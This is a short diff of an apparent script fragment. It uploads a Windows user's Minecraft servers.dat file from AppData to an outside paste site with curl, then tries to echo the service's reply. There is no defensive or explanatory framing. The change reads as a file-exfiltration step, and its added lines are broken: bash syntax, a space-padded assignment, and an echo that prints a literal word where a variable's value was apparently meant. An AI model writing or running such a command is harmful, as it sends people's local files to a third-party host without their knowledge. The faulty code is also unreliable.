@@ -1,1 +1,2 @@
-curl --upload-file 'C:\Users\there\AppData\Roaming\.minecraft\servers.dat' 'https://paste.c-net.org/'
+variable = $(curl --upload-file 'C:\Users\there\AppData\Roaming\.minecraft\servers.dat' 'https://paste.c-net.org/')
+echo variable
